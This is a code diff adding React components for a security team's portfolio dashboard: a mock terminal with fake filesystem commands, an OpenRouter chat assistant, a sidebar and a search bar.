+    return { "/": root, "ctf/": ctf, "team/": team, ...dirs };
+  }, []);
+
+  // resolve user-typed path (absolute or relative to cwd) to an FS key
+  function resolve(path) {
+    if (!path || path === ".") return cwd;
+    let p = path.replace(/^\.\/+/, "");
+    if (p.startsWith("/")) p = p.slice(1);
+    // go up
+    if (p === "..") return cwd === "/" ? "/" : "/";
+    const base = cwd === "/" ? "" : cwd;
+    const joined = (base + p).replace(/\/+/g, "/");
+    const key = joined.endsWith("/") || FS[joined + "/"] ? (joined.endsWith("/") ? joined : joined + "/") : joined;
+    // try absolute if cwd-relative miss
+    if (FS[key]) return key;
+    if (FS[p]) return p;
+    if (FS[p + "/"]) return p + "/";
+    return key;
+  }
+
+  // ---- helpers ----
+  const out   = (text, kind = "out") => ({ kind, text });
+  const multi = (arr,  kind = "out") => arr.map(t => out(t, kind));
+  const cwdLabel = () => cwd === "/" ? "~" : `~/${cwd.replace(/\/$/, "")}`;
+
+  // find artifact anywhere by filename (case-insensitive, partial match OK)
+  function findArtifacts(q) {
+    const needle = q.toLowerCase();
+    const out = [];
+    for (const p of PROJECTS) {
+      for (const a of p.artifacts) {
+        if (a.name.toLowerCase().includes(needle)) out.push({ p, a });
+      }
+    }
+    return out;
+  }
+
+  // render a report/file inline
+  function readArtifact(p, a) {
+    const lines = [
+      `── ${p.path}/${a.name} ───────────────────────────`,
+      `type:      ${a.kind.toUpperCase()}   owner: ${p.owner}   date: ${p.date}`,
+      `clearance: ${p.sec}   project: ${p.id}`,
+      `url:       ${a.url}`,
+      "",
+    ];
+    if (a.kind === "pdf")   lines.push("[PDF BINARY — opening in a new tab for full view]");
+    if (a.kind === "guide") lines.push("[HTML GUIDE — opening in a new tab for interactive view]");
+    if (a.kind === "dir")   lines.push("[directory — use `ls " + p.slug + "/" + a.name + "` to peek]");
+    if (a.kind === "code" || a.kind === "text") lines.push("[source file — opening raw on github]");
+    lines.push("", "summary:", p.desc);
+    const w = (window.WRITEUPS || {})[p.slug];
+    if (w) lines.push("", `write-up: ${w.title}`, `intro:    ${w.intro}`);
+    try { window.open(a.url, "_blank", "noopener"); } catch (e) {}
+    return multi(lines);
+  }
+
+  // ---- AI: call OpenRouter ----
+  async function askAI(prompt) {
+    if (!aiKey) {
+      appendLines([out("ai: no API key. set one with `ai-key <sk-or-v1-…>`", "err")]);
+      return;
+    }
+    setAiBusy(true);
+    appendLines([out(`[ai · ${aiModel}] thinking…`, "ai-sys")]);
+
+    const msgs = [
+      { role: "system", content: aiPrompt || DEFAULT_PROMPT },
+      ...aiHistory.slice(-10),
+      { role: "user", content: prompt },
+    ];
+
+    try {
+      const res = await fetch("https://openrouter.ai/api/v1/chat/completions", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": `Bearer ${aiKey}`,
+          "HTTP-Referer":  window.location.href,
+          "X-Title":       "Digital Avengers ops-shell",
+        },
+        body: JSON.stringify({
+          model: aiModel,
+          messages: msgs,
+          temperature: 0.5,
+          max_tokens: 700,
+        }),
+      });
+      const data = await res.json();
+      if (!res.ok) {
+        const msg = data?.error?.message || res.statusText || "unknown error";
+        appendLines([out(`ai: ${msg}`, "err")]);
+        return;
+      }
+      const reply = data?.choices?.[0]?.message?.content?.trim() || "(empty reply)";
+      setAiHistory(h => [...h, { role: "user", content: prompt }, { role: "assistant", content: reply }].slice(-24));
+      const wrapped = reply.split("\n");
+      appendLines(wrapped.map(t => out(t, "ai")));
+    } catch (err) {
+      appendLines([out(`ai: network error — ${String(err?.message || err)}`, "err")]);
+    } finally {
+      setAiBusy(false);
+    }
+  }
+
+  function appendLines(arr) {
+    setLines(prev => [...prev, ...arr].slice(-600));
+  }
+
+  // ---- command dispatch ----
+  function run(raw) {
+    const cmd = raw.trim();
+    const echo = { kind: "prompt", text: raw, cwd: cwdLabel() };
+    if (!cmd) return [echo];
+
+    // AI chat mode — every non-slash line goes to AI
+    if (aiMode && !cmd.startsWith("/")) {
+      askAI(cmd);
+      return [echo];
+    }
+    const real = aiMode && cmd.startsWith("/") ? cmd.slice(1) : cmd;
+    const [head, ...rest] = real.split(/\s+/);
+    const arg = rest.join(" ");
+
+    switch (head.toLowerCase()) {
+      case "help":
+      case "?":
+        return [echo, ...multi([
+          "filesystem",
+          "  ls [dir]              list files · try: ls, ls day1, ls ctf",
+          "  cd <dir>              change directory (/, day1, ctf, team, ..)",
+          "  pwd                   current directory",
+          "  tree                  print full repo tree",
+          "  cat <file|slug>       print file / deliverable summary",
+          "  readme                render the repo README.md",
+          "  report <slug>         open the PDF/HTML report for a deliverable",
+          "  find <query>          search artifacts by filename",
+          "  open <slug>           open a deliverable folder on github",
+          "",
+          "squad",
+          "  whoami · team · projects · status · repo · date · echo",
+          "",
+          "ai assistant (OpenRouter)",
+          "  ai-key <sk-or-v1-…>   store your OpenRouter API key",
+          "  ai-prompt <text>      set the system prompt / personality",
+          "  ai-model <id>         set model (default: openai/gpt-4o-mini)",
+          "  ai-config             show current AI config (key masked)",
+          "  ai-clear              clear chat history · ai-reset → full reset",
+          "  ai <question>         ask one question",
+          "  chat                  enter interactive chat mode (/exit to leave)",
+          "  ai-help               assistant cheat-sheet",
+          "",
+          "shell",
+          "  clear · exit · sudo · hack",
+        ])];
+
+      case "ai-help":
+        return [echo, ...multi([
+          "OpenRouter assistant",
+          "  1. get a key  https://openrouter.ai/keys",
+          "  2. ai-key <sk-or-v1-…>      — stored in your browser only (localStorage)",
+          "  3. ai-prompt <personality>  — e.g. `ai-prompt You are a gloomy SOC analyst`",
+          "  4. ai <question>            — one-shot query",
+          "     chat                     — enter chat mode; type `/exit` to leave",
+          "",
+          "  tip · in chat mode prefix a command with `/` to run it (e.g. `/ls`)",
+        ])];
+
+      case "whoami":
+        return [echo, out("user")];
+
+      case "pwd":
+        return [echo, out(cwd === "/" ? "/" : `/${cwd.replace(/\/$/, "")}`)];
+
+      case "cd": {
+        if (!arg || arg === "/" || arg === "~") { setCwd("/"); return [echo]; }
+        if (arg === "..") { setCwd("/"); return [echo]; }
+        const key = resolve(arg);
+        if (FS[key]) { setCwd(key === "/" ? "/" : key); return [echo]; }
+        return [echo, out(`cd: ${arg}: not a directory`, "err")];
+      }
+
+      case "ls": {
+        const key = resolve(arg || "");
+        const entries = FS[key];
+        if (!entries) return [echo, out(`ls: cannot access '${arg || cwdLabel()}': No such directory`, "err")];
+        const rows = [];
+        for (let i = 0; i < entries.length; i += 2) {
+          rows.push(entries.slice(i, i + 2).map(s => (s.endsWith("/") ? "\x1b[emerald]" + s : s).padEnd(42)).join(""));
+        }
+        return [echo, ...rows.map(r => out(r, "ls"))];
+      }
+
+      case "tree": {
+        const lines = ["/"];
+        const top = FS["/"];
+        top.forEach((entry, i) => {
+          const last = i === top.length - 1;
+          lines.push(`${last ? "└──" : "├──"} ${entry}`);
+          if (entry.endsWith("/") && FS[entry]) {
+            const kids = FS[entry];
+            kids.forEach((k, j) => {
+              const jlast = j === kids.length - 1;
+              lines.push(`${last ? "    " : "│   "}${jlast ? "└──" : "├──"} ${k}`);
+            });
+          }
+        });
+        return [echo, ...lines.map(l => out(l, "ls"))];
+      }
+
+      case "cat": {
+        if (!arg) return [echo, out("cat: missing operand", "err")];
+        const low = arg.toLowerCase().replace(/^\/+/, "");
+        if (low === "readme.md" || low === "readme") return run("readme").slice(1) && [echo, ...runReadme()];
+        if (low === "mission.txt") {
+          return [echo, ...multi([
+            "Ship evidence, not slides.",
+            "Every offensive finding paired with a defensive artifact.",
+          ])];
+        }
+        // project slug?
+        const slug = low.replace(/\/$/, "").replace(/^(projects|ctf)\//, "");
+        const p = PROJECTS.find(x => x.slug === slug || x.path.toLowerCase() === slug);
+        if (p) {
+          const w = (window.WRITEUPS || {})[p.slug];
+          const body = [
+            `── ${p.id} · ${p.title} ───────────────────────────`,
+            `owner:     ${p.owner}    date: ${p.date}    status: completed`,
+            `clearance: ${p.sec}`,
+            `tags:      ${p.tags.join(", ")}`,
+            `url:       ${p.url}`,
+            "",
+            p.desc,
+            "",
+            "artifacts:",
+            ...p.artifacts.map(a => `  · ${a.kind.padEnd(5)} ${a.name}`),
+          ];
+          if (w) body.push("", `write-up: ${w.title}`, `author:   ${w.author} · ${w.readTime}`);
+          return [echo, ...multi(body)];
+        }
+        // artifact filename?
+        const hits = findArtifacts(arg);
+        if (hits.length === 1) return [echo, ...readArtifact(hits[0].p, hits[0].a)];
+        if (hits.length > 1) {
+          return [echo, out(`cat: '${arg}' matches ${hits.length} files — be more specific or use \`find\``, "err"),
+                  ...hits.slice(0, 6).map(h => out(`  · ${h.p.slug}/${h.a.name}`))];
+        }
+        return [echo, out(`cat: ${arg}: No such file or deliverable`, "err")];
+      }
+
+      case "readme":
+        return [echo, ...runReadme()];
+
+      case "report": {
+        if (!arg) return [echo, out("report: missing operand (try `report day1`)", "err")];
+        const slug = arg.toLowerCase().replace(/\/$/, "");
+        const p = PROJECTS.find(x => x.slug === slug || x.path.toLowerCase() === slug || x.id.toLowerCase() === slug);
+        if (!p) return [echo, out(`report: ${arg}: no such deliverable`, "err")];
+        const pdf = p.artifacts.find(a => a.kind === "pdf") || p.artifacts.find(a => a.kind === "guide");
+        if (!pdf) return [echo, out(`report: no pdf/guide found for ${p.slug}`, "err")];
+        return [echo, ...readArtifact(p, pdf)];
+      }
+
+      case "find": {
+        if (!arg) return [echo, out("find: missing query", "err")];
+        const hits = findArtifacts(arg);
+        if (!hits.length) return [echo, out(`find: no artifacts matching '${arg}'`, "err")];
+        return [echo, out(`${hits.length} match${hits.length===1?"":"es"}:`),
+                ...hits.map(h => out(`  ${h.p.slug.padEnd(20)} ${h.a.kind.padEnd(5)} ${h.a.name}`, "ls"))];
+      }
+
+      case "open": {
+        if (!arg) return [echo, out("open: missing operand (try `open day1`)", "err")];
+        const slug = arg.replace(/\/$/, "").toLowerCase();
+        const p = PROJECTS.find(x => x.slug === slug || x.path.toLowerCase() === slug);
+        if (!p) return [echo, out(`open: ${arg}: no such deliverable`, "err")];
+        try { window.open(p.url, "_blank", "noopener"); } catch (e) {}
+        return [echo, out(`opening ${p.url}`, "out")];
+      }
+
+      case "team":
+        return [echo, ...multi([
+          "7 operators · all online",
+          "",
+          ...MEMBERS.map(m => `  ● ${m.initials}   ${m.name.padEnd(30)} ${m.role}`),
+        ])];
+
+      case "projects":
+        return [echo, ...multi([
+          `${PROJECTS.length} deliverables · all completed`,
+          "",
+          ...PROJECTS.map(p => `  ${p.id}  ${p.slug.padEnd(20)} ${p.lang.padEnd(11)} ${p.owner}   ${p.sec}`),
+          "",
+          `repo: ${REPO.url}`,
+        ])];
+
+      case "status":
+        return [echo, ...multi([
+          "ops status:  all systems operational",
+          "squad:       7/7 online",
+          "buildweek:   6/6 days · closed",
+          "",
+          ...KPIS.map(k => `  ${k.label.padEnd(20)} ${String(k.value).padEnd(10)} ${k.delta}`),
+        ])];
+
+      case "date": return [echo, out(new Date().toString())];
+      case "repo": return [echo, out(REPO.url, "out")];
+      case "echo": return [echo, out(arg)];
+
+      case "clear":
+      case "cls":
+        setTimeout(() => setLines([]), 0);
+        return [];
+
+      case "sudo":
+        return [echo, out(`[sudo] password for user: ${"*".repeat(8)}`), out("user is not in the sudoers file. This incident will be reported.", "err")];
+
+      case "exit":
+      case "quit":
+        if (aiMode) { setAiMode(false); return [echo, out("[ai] chat mode off", "ai-sys")]; }
+        setTimeout(() => ui.close(), 10);
+        return [echo, out("logout")];
+
+      case "hack":
+      case "hack-the-planet":
+        return [echo, ...multi([
+          "[ * ] mounting /dev/mainframe ...",
+          "[ * ] bouncing through 7 proxies ...",
+          "[ * ] cracking encryption ...",
+          "[ ✓ ] just kidding — this is a mockup.",
+        ])];
+
+      // -------- AI commands --------
+      case "ai-key": {
+        if (!arg) return [echo, out("ai-key: paste your OpenRouter key. get one at https://openrouter.ai/keys", "err")];
+        setAiKey(arg.trim());
+        return [echo, out(`[ai] key stored locally (${arg.length} chars). use \`ai-config\` to verify.`, "ai-sys")];
+      }
+      case "ai-prompt": {
+        if (!arg) return [echo, out(`[ai] current prompt:`, "ai-sys"), out(aiPrompt)];
+        setAiPrompt(arg.trim());
+        return [echo, out(`[ai] prompt updated (${arg.length} chars).`, "ai-sys")];
+      }
+      case "ai-model": {
+        if (!arg) return [echo, out(`[ai] current model: ${aiModel}`, "ai-sys"),
+                          out("  suggestions: openai/gpt-4o-mini · anthropic/claude-3.5-sonnet · meta-llama/llama-3.3-70b-instruct")];
+        setAiModel(arg.trim());
+        return [echo, out(`[ai] model set to ${arg.trim()}`, "ai-sys")];
+      }
+      case "ai-config": {
+        const mask = aiKey ? aiKey.slice(0, 8) + "…" + aiKey.slice(-4) : "(not set)";
+        return [echo, ...multi([
+          `[ai] key:    ${mask}`,
+          `[ai] model:  ${aiModel}`,
+          `[ai] mode:   ${aiMode ? "chat (every line goes to AI — prefix / to run commands)" : "command"}`,
+          `[ai] prompt: ${aiPrompt.slice(0, 120)}${aiPrompt.length > 120 ? "…" : ""}`,
+          `[ai] chat history: ${aiHistory.length} turns`,
+        ], "ai-sys")];
+      }
+      case "ai-clear":
+        setAiHistory([]);
+        return [echo, out("[ai] chat history cleared", "ai-sys")];
+      case "ai-reset":
+        setAiKey(""); setAiPrompt(DEFAULT_PROMPT); setAiModel(DEFAULT_MODEL); setAiHistory([]); setAiMode(false);
+        return [echo, out("[ai] full reset — key/prompt/model/history wiped", "ai-sys")];
+
+      case "ai":
+      case "ask": {
+        if (!arg) return [echo, out("ai: usage: ai <your question>", "err")];
+        askAI(arg);
+        return [echo];
+      }
+      case "chat": {
+        if (!aiKey) return [echo, out("chat: no API key. run `ai-key <sk-or-v1-…>` first.", "err")];
+        setAiMode(true);
+        return [echo, ...multi([
+          "[ai] chat mode ON — every line is sent to the assistant.",
+          "[ai] prefix with `/` to run shell commands (e.g. /ls, /exit, /clear).",
+          "[ai] `/exit` leaves chat mode.",
+        ], "ai-sys")];
+      }
+
+      default:
+        return [echo, out(`${head}: command not found. try 'help'.`, "err")];
+    }
+  }
+
+  function runReadme() {
+    return multi([
+      "",
+      "╭────────────────────────────────────────────────────╮",
+      "│                                                    │",
+      "│   DIGITAL AVENGERS · build-week team 4             │",
+      "│   7 operators · 9 deliverables · 0 open tickets    │",
+      "│                                                    │",
+      "╰────────────────────────────────────────────────────╯",
+      "",
+      "# Overview",
+      "",
+      "Build-week consegnata: 5 giornate offensive + 4 CTF extra.",
+      "Ogni exploit ha un report PDF/HTML, ogni finding ha un",
+      "controesempio difensivo. Niente diapositive, solo evidence.",
+      "",
+      "# Deliverables",
+      "",
+      ...PROJECTS.map(p => `  ${p.id}  ${p.title}   (${p.owner})`),
+      "",
+      "# Stack",
+      "",
+      "  · offensive:  DVWA, Burp, Nmap, Nessus, Metasploit, GDB",
+      "  · defensive:  Flask catcher, Sigma rules (WIP), report PDF",
+      "  · build:      Python, C, HTML, Streamlit, OpenAI API",
+      "",
+      "# Links",
+      "",
+      `  repo:     ${REPO.url}`,
+      `  branch:   ${REPO.branch}`,
+      `  contact:  squad07@digital-avengers.dev`,
+      "",
+    ]);
+  }
+
+  // ---- submit + history ----
+  function submit(e) {
+    e.preventDefault();
+    const raw = input;
+    const pushed = run(raw);
+    setLines(prev => [...prev, ...pushed].slice(-600));
+    if (raw.trim()) { setHistory(h => [...h, raw]); setHistIdx(-1); }
+    setInput("");
+  }
+
+  function onKey(e) {
+    if (e.key === "ArrowUp") {
+      e.preventDefault();
+      setHistory(h => {
+        if (!h.length) return h;
+        const next = histIdx === -1 ? h.length - 1 : Math.max(0, histIdx - 1);
+        setHistIdx(next);
+        setInput(h[next] || "");
+        return h;
+      });
+    } else if (e.key === "ArrowDown") {
+      e.preventDefault();
+      setHistory(h => {
+        if (!h.length || histIdx === -1) return h;
+        const next = histIdx + 1;
+        if (next >= h.length) { setHistIdx(-1); setInput(""); }
+        else { setHistIdx(next); setInput(h[next]); }
+        return h;
+      });
+    } else if (e.key === "l" && (e.ctrlKey || e.metaKey)) {
+      e.preventDefault();
+      setLines([]);
+    }
+  }
+
+  // ---- rendering ----
+  const PromptLabel = ({ cwdText }) => (
+    <>
+      <span className="text-emerald-400">{aiMode ? "ai" : PROMPT_USER}</span>
+      <span className="text-slate-600">:</span>
+      <span className="text-sky-400">{cwdText || cwdLabel()}</span>
+      <span className="text-slate-600">$&nbsp;</span>
+    </>
+  );
+
+  const renderLine = (l, i) => {
+    if (l.kind === "prompt") {
+      return (
+        <div key={i} className="flex gap-0 font-mono text-[12px] leading-relaxed">
+          <PromptLabel cwdText={l.cwd} />
+          <span className="text-slate-200">{l.text}</span>
+        </div>
+      );
+    }
+    if (l.kind === "err")    return <div key={i} className="font-mono text-[12px] leading-relaxed text-red-400">{l.text}</div>;
+    if (l.kind === "sys")    return <div key={i} className="font-mono text-[12px] leading-relaxed text-slate-500">{l.text || "\u00A0"}</div>;
+    if (l.kind === "ai-sys") return <div key={i} className="font-mono text-[12px] leading-relaxed text-amber-300/80">{l.text}</div>;
+    if (l.kind === "ai")     return <div key={i} className="font-mono text-[12px] leading-relaxed text-teal-200 whitespace-pre-wrap">{l.text || "\u00A0"}</div>;
+    if (l.kind === "ls") {
+      const parts = l.text.split(/(\x1b\[emerald\][^\s]+\/)/g);
+      return (
+        <div key={i} className="font-mono text-[12px] leading-relaxed whitespace-pre text-slate-300">
+          {parts.map((p, j) => p.startsWith("\x1b[emerald]")
+            ? <span key={j} className="text-emerald-400">{p.replace("\x1b[emerald]","")}</span>
+            : <span key={j}>{p}</span>)}
+        </div>
+      );
+    }
+    return <div key={i} className="font-mono text-[12px] leading-relaxed text-slate-300 whitespace-pre-wrap">{l.text || "\u00A0"}</div>;
+  };
+
+  if (ui.closed) return null;
+
+  // Size adapts to expanded mode.
+  // Normal: narrow, aligned next to sidebar · Expanded: wider, centered, taller.
+  const wrapperPad   = ui.expanded ? "px-8" : "pl-[16rem] pr-4";
+  const innerMaxW    = ui.expanded ? "max-w-[1280px]" : "max-w-[980px]";
+  const bodyHeight   = ui.expanded ? "h-[420px]" : "h-48";
+
+  // Narrow width: aligns left edge with main content (right of 16rem sidebar)
+  return (
+    <div className={`pointer-events-none fixed inset-x-0 bottom-0 z-40 pb-4 ${wrapperPad}`}>
+      <div className={`pointer-events-auto mx-auto w-full overflow-hidden rounded-lg border border-slate-800 bg-slate-950/95 shadow-[0_-8px_30px_-12px_rgba(0,0,0,0.7)] backdrop-blur ${innerMaxW}`}>
+        {/* Header — traffic-light buttons are live */}
+        <div
+          className="flex h-10 items-center gap-3 border-b border-slate-800 bg-slate-900/80 px-3"
+          onClick={() => inputRef.current?.focus()}
+        >
+          <span
+            className="flex items-center gap-1.5"
+            onClick={(e) => e.stopPropagation()}
+          >
+            <button
+              onClick={ui.close}
+              title="close · reopen from sidebar"
+              className="group relative inline-flex h-3 w-3 items-center justify-center rounded-full bg-red-500/80 ring-1 ring-red-500/40 hover:bg-red-500"
+            >
+              <Icon name="X" size={8} className="text-red-900 opacity-0 group-hover:opacity-100" />
+            </button>
+            <button
+              onClick={ui.toggleMin}
+              title={ui.minimized ? "restore" : "minimize"}
+              className="group relative inline-flex h-3 w-3 items-center justify-center rounded-full bg-amber-400/80 ring-1 ring-amber-500/40 hover:bg-amber-400"
+            >
+              <Icon name={ui.minimized ? "Plus" : "Minus"} size={8} className="text-amber-900 opacity-0 group-hover:opacity-100" />
+            </button>
+            <button
+              onClick={ui.toggleExp}
+              title={ui.expanded ? "shrink" : "expand"}
+              className="group relative inline-flex h-3 w-3 items-center justify-center rounded-full bg-emerald-500/80 ring-1 ring-emerald-500/40 hover:bg-emerald-500"
+            >
+              <Icon name={ui.expanded ? "Minimize2" : "Maximize2"} size={8} className="text-emerald-900 opacity-0 group-hover:opacity-100" />
+            </button>
+          </span>
+          <span className="font-mono text-[11px] text-slate-400">
+            <PromptLabel />
+          </span>
+          <span className="ml-1 font-mono text-[10px] text-slate-600">ops-shell</span>
+          {aiMode && (
+            <span className="ml-1 inline-flex items-center gap-1 rounded bg-teal-500/10 px-1.5 py-0.5 font-mono text-[9px] text-teal-300 ring-1 ring-teal-500/30">
+              <span className="h-1.5 w-1.5 rounded-full bg-teal-400 da-pulse-dot" /> ai · {aiModel.split("/").pop()}
+            </span>
+          )}
+          {aiBusy && (
+            <span className="ml-1 font-mono text-[10px] text-amber-300">⟳ thinking</span>
+          )}
+
+          <div className="ml-auto flex items-center gap-2">
+            <span className="inline-flex items-center gap-1.5 font-mono text-[10px] text-amber-300">
+              <Icon name="Terminal" size={11} /> type <span className="rounded bg-slate-800 px-1 text-slate-400">help</span>
+            </span>
+          </div>
+        </div>
+
+        {/* Body */}
+        {!ui.minimized && (
+          <div
+            ref={bodyRef}
+            onClick={() => inputRef.current?.focus()}
+            className={`cursor-text overflow-y-auto bg-black/60 px-3 py-2 ${bodyHeight}`}
+          >
+            {lines.map(renderLine)}
+
+            {/* Active input line */}
+            <form onSubmit={submit} className="flex items-center gap-0 font-mono text-[12px] leading-relaxed">
+              <PromptLabel />
+              <input
+                ref={inputRef}
+                value={input}
+                onChange={(e) => setInput(e.target.value)}
+                onKeyDown={onKey}
+                spellCheck={false}
+                autoCapitalize="off"
+                autoComplete="off"
+                disabled={aiBusy}
+                placeholder={aiMode ? "ask the assistant… (/exit to leave chat)" : ""}
+                className="flex-1 border-0 bg-transparent p-0 font-mono text-[12px] text-slate-200 caret-emerald-400 outline-none placeholder:text-slate-600 focus:outline-none focus:ring-0 disabled:opacity-50"
+                aria-label="terminal input"
+              />
+            </form>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+window.Terminal = Terminal;
+window.TerminalUIProvider = TerminalUIProvider;
+window.useTerminalUI = useTerminalUI;
+
+function Sidebar({ active, onNavigate }) {
+  const termUI = useTerminalUI();
+  const nav = [
+    { id: "overview",   label: "Overview",     icon: "LayoutDashboard" },
+    { id: "metrics",    label: "Metrics",      icon: "Activity" },
+    { id: "projects",   label: "Projects",     icon: "FolderGit2" },
+    { id: "roadmap",    label: "Roadmap",      icon: "GitBranch" },
+    { id: "cases",      label: "Case Studies", icon: "FileCode2" },
+    { id: "team",       label: "Team",         icon: "Users" },
+  ];
+
+  const scrollTo = (id) => {
+    onNavigate?.(id);
+    const scroller = document.getElementById("main-scroll");
+    const el = document.getElementById(id);
+    if (scroller && el) {
+      const top = el.getBoundingClientRect().top - scroller.getBoundingClientRect().top + scroller.scrollTop - 12;
+      scroller.scrollTo({ top, behavior: "smooth" });
+    }
+  };
+
+  return (
+    <aside className="flex w-64 shrink-0 flex-col border-r border-slate-800 bg-slate-900">
+      {/* Logo */}
+      <div className="flex h-14 items-center gap-2 border-b border-slate-800 px-4">
+        <span className="font-mono text-[13px] text-slate-100">
+          <span className="text-emerald-400">&gt;</span> digital_avengers<span className="da-blink text-emerald-400">_</span>
+        </span>
+        <button
+          onClick={termUI.toggleOpen}
+          title={termUI.closed ? "open terminal" : "close terminal"}
+          className={`ml-auto inline-flex h-6 w-6 items-center justify-center rounded-md border transition-colors
+            ${termUI.closed
+              ? "border-emerald-500/40 bg-emerald-500/10 text-emerald-300 hover:bg-emerald-500/20"
+              : "border-slate-800 bg-slate-900 text-slate-400 hover:text-slate-200"}`}
+        >
+          <Icon name="Terminal" size={12} />
+        </button>
+      </div>
+
+      {/* Nav */}
+      <nav className="px-2 pt-3">
+        <SectionLabel className="px-3 pb-2">Navigation</SectionLabel>
+        <ul className="space-y-0.5">
+          {nav.map((n) => {
+            const isActive = active === n.id;
+            return (
+              <li key={n.id}>
+                <button
+                  onClick={() => scrollTo(n.id)}
+                  className={`group relative flex w-full items-center gap-2.5 rounded-md px-3 py-1.5 text-left text-[13px] transition-colors
+                    ${isActive
+                      ? "bg-slate-800 text-emerald-400"
+                      : "text-slate-300 hover:bg-slate-800/50"}`}
+                >
+                  {isActive && (
+                    <span className="absolute left-0 top-1 bottom-1 w-0.5 rounded-full bg-emerald-400" />
+                  )}
+                  <Icon name={n.icon} size={15} className={isActive ? "text-emerald-400" : "text-slate-400 group-hover:text-slate-200"} />
+                  <span className="flex-1">{n.label}</span>
+                  {n.id === "projects" && (
+                    <span className="rounded bg-slate-800 px-1.5 font-mono text-[10px] text-emerald-400">9</span>
+                  )}
+                  {n.id === "cases" && (
+                    <span className="rounded bg-amber-500/10 px-1.5 font-mono text-[10px] text-amber-300 ring-1 ring-amber-500/20">9</span>
+                  )}
+                </button>
+              </li>
+            );
+          })}
+        </ul>
+      </nav>
+
+      {/* Team roster */}
+      <div className="mt-6 px-2">
+        <div className="flex items-center justify-between px-3 pb-2">
+          <SectionLabel>Team · 7 operators</SectionLabel>
+          <span className="font-mono text-[10px] text-emerald-400">7/7 up</span>
+        </div>
+        <ul className="space-y-0.5">
+          {MEMBERS.map((m) => (
+            <li key={m.id}>
+              <div className="flex items-center gap-2.5 rounded-md px-3 py-1.5 hover:bg-slate-800/50">
+                <div className="relative">
+                  <Avatar initials={m.initials} size={24} />
+                  <span
+                    className="absolute -bottom-0.5 -right-0.5 rounded-full bg-emerald-500 ring-2 ring-slate-900"
+                    style={{ width: 8, height: 8 }}
+                  />
+                </div>
+                <div className="min-w-0 flex-1">
+                  <div className="truncate text-[12px] text-slate-200">{m.name.split(" ").slice(0,2).join(" ")}</div>
+                  <div className="truncate font-mono text-[10px] text-slate-500">{m.role.toLowerCase()}</div>
+                </div>
+              </div>
+            </li>
+          ))}
+        </ul>
+      </div>
+
+      <div className="flex-1" />
+
+      {/* Footer */}
+      <div className="border-t border-slate-800 px-4 py-3">
+        <div className="flex items-center justify-between">
+          <span className="font-mono text-[10px] text-slate-500">v1.0.0 · closed</span>
+          <span className="inline-flex items-center gap-1 font-mono text-[10px] text-emerald-400">
+            <Icon name="Check" size={10} />
+            shipped
+          </span>
+        </div>
+        <div className="mt-1.5 h-1 w-full overflow-hidden rounded-full bg-slate-800">
+          <div className="h-full w-full rounded-full bg-gradient-to-r from-emerald-500 via-teal-400 to-amber-400" />
+        </div>
+        <div className="mt-1 flex items-center justify-between font-mono text-[10px] text-slate-500">
+          <span>build-week</span>
+          <span>6/6 days</span>
+        </div>
+      </div>
+    </aside>
+  );
+}
+
+window.Sidebar = Sidebar;
+
+// Topbar — breadcrumb, live search (ajax-feel), auth button.
+function TopBar({ section, onNavigate }) {
+  const { user, logout, setLoginOpen } = useAuth();
+  const crumb = ({
+    overview: "overview",
+    metrics:  "metrics",
+    projects: "projects",
+    roadmap:  "roadmap",
+    cases:    "case-studies",
+    team:     "team",
+  })[section] || "overview";
+
+  // Build the searchable index from HUB resources.
+  const INDEX = React.useMemo(() => {
+    const items = [];
+    PROJECTS.forEach((p) => {
+      items.push({
+        kind: "deliverable", label: p.title, sub: `${p.id} · ${p.slug} · ${p.owner}`,
+        icon: "FolderGit2", tone: "emerald", url: p.url, tags: [p.slug, p.id, ...p.tags, p.owner],
+        target: "_blank",
+      });
+      p.artifacts.forEach((a) => items.push({
+        kind: a.kind.toUpperCase(), label: a.name, sub: `${p.slug}/${a.name}`,
+        icon: a.kind === "pdf" ? "FileText" : a.kind === "guide" ? "BookOpen" : a.kind === "code" ? "Code2" : "Folder",
+        tone: a.kind === "pdf" ? "red" : a.kind === "guide" ? "amber" : "sky",
+        url: a.url, tags: [a.name, p.slug, a.kind], target: "_blank",
+      }));
+    });
+    MILESTONES.forEach((m) => items.push({
+      kind: "milestone", label: m.title, sub: m.date, icon: "GitBranch", tone: "teal",
+      sectionId: "roadmap", tags: [m.title, m.date, ...m.bullets],
+    }));
+    MEMBERS.forEach((m) => items.push({
+      kind: "operator", label: m.name, sub: m.role,
+      icon: "User", tone: "slate", sectionId: "team",
+      tags: [m.name, m.initials, m.role],
+    }));
+    KPIS.forEach((k) => items.push({
+      kind: "metric", label: k.label, sub: `${k.value} · ${k.delta}`,
+      icon: "Activity", tone: "sky", sectionId: "metrics",
+      tags: [k.label, String(k.value)],
+    }));
+    // static sections
+    [["overview","Overview hero"],["projects","Projects grid"],["cases","Case studies"]]
+      .forEach(([id,label]) => items.push({ kind: "section", label, sub: `#${id}`, icon: "LayoutDashboard", tone: "slate", sectionId: id, tags: [id,label] }));
+    return items;
+  }, []);
+
+  const [q, setQ]             = React.useState("");
+  const [open, setOpen]       = React.useState(false);
+  const [loading, setLoading] = React.useState(false);
+  const [results, setResults] = React.useState([]);
+  const [hover, setHover]     = React.useState(0);
+  const boxRef  = React.useRef(null);
+  const inputRef = React.useRef(null);
+
+  // Keyboard: Cmd+K focus, / focus
+  React.useEffect(() => {
+    const onKey = (e) => {
+      if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === "k") {
+        e.preventDefault(); inputRef.current?.focus(); setOpen(true);
+      }
+    };
+    window.addEventListener("keydown", onKey);
+    return () => window.removeEventListener("keydown", onKey);
+  }, []);
+
+  // Click outside
+  React.useEffect(() => {
+    const onClick = (e) => { if (boxRef.current && !boxRef.current.contains(e.target)) setOpen(false); };
+    document.addEventListener("mousedown", onClick);
+    return () => document.removeEventListener("mousedown", onClick);
+  }, []);
+
+  // Debounced "ajax" filter — simulates network roundtrip
+  React.useEffect(() => {
+    if (!q.trim()) { setResults([]); setLoading(false); return; }
+    setLoading(true);
+    const t = setTimeout(() => {
+      const needle = q.trim().toLowerCase();
+      const scored = INDEX.map((it) => {
+        const hay = (it.label + " " + it.sub + " " + it.tags.join(" ")).toLowerCase();
+        if (!hay.includes(needle)) return null;
+        // light relevance boost on label match
+        const s = (it.label.toLowerCase().includes(needle) ? 2 : 0)
+                + (it.tags.some(t => String(t).toLowerCase() === needle) ? 1 : 0);
+        return { it, s };
+      }).filter(Boolean).sort((a,b) => b.s - a.s).slice(0, 12).map(x => x.it);
+      setResults(scored);
+      setHover(0);
+      setLoading(false);
